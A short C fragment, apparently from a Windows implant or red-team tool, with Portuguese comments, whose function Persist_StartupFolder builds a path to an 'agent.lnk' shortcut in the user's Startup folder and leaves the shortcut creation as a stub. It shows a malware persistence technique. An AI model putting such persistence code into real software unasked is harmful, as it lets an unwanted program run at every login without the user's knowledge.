// startup_folder.c â€“ Copiar para pasta de inicializaÃ§Ã£o
#include <windows.h>
#include <stdio.h>

void Persist_StartupFolder() {
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path);
    strcat(path, "\\agent.lnk");
    // Criar atalho (requer IShellLink)
}
